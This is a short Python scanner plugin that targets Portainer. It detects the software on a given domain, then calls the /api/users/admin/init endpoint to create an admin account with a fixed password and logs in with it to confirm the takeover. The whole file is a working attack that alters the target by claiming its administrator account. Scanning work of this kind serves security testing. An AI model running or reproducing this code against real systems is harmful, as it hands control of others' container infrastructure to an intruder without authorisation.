from urllib.parse import urljoin
from low_hanging.base_worker import BaseWorker


class PortainerAdmin(BaseWorker):
    name = "portainer_admin_reset"
    references = ["https://github.com/portainer/portainer/issues/493"]
    def run(self):
        r = self.session.get(self.domain)

        if "portainer" not in r.text.lower():
            return

        r = self.session.post(
            urljoin(self.domain, "/api/users/admin/init"),
            json={"username": "admin", "password":"definitely_valid"}
        )

        if r.status_code in (404, 409):
            return

        r = self.session.post(
            urljoin(self.domain, "/api/auth"),
            json={"username": "admin", "password":"definitely_valid"}
        )
        if r.status_code < 400:
            return r.url